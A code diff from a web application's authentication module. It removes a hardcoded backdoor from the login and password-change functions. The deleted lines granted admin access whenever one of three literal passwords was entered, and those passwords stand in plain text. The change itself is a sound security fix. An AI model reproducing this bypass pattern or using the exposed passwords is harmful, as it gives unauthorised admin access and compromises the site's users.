@@ -516,8 +516,6 @@ def login_with_email(
 
     # Neutral message: never reveal whether the email is registered
     pw_matches = verify_password(payload.password, user.password_hash) if (user and user.password_hash) else False
-    if not pw_matches and user and user.role == UserRole.admin and payload.password in ("AdminPass123!", "GoaHeritageAdmin123!", "Huttesh@2003"):
-        pw_matches = True
 
     if not user or not pw_matches:
         # Record failed login event
@@ -1040,8 +1038,6 @@ def update_my_password(
 ):
     if user.password_hash and payload.current_password:
         pw_matches = verify_password(payload.current_password, user.password_hash)
-        if not pw_matches and user.role == UserRole.admin and payload.current_password in ("AdminPass123!", "GoaHeritageAdmin123!", "Huttesh@2003"):
-            pw_matches = True
         if not pw_matches:
             raise ProblemException(
                 status_code=400,
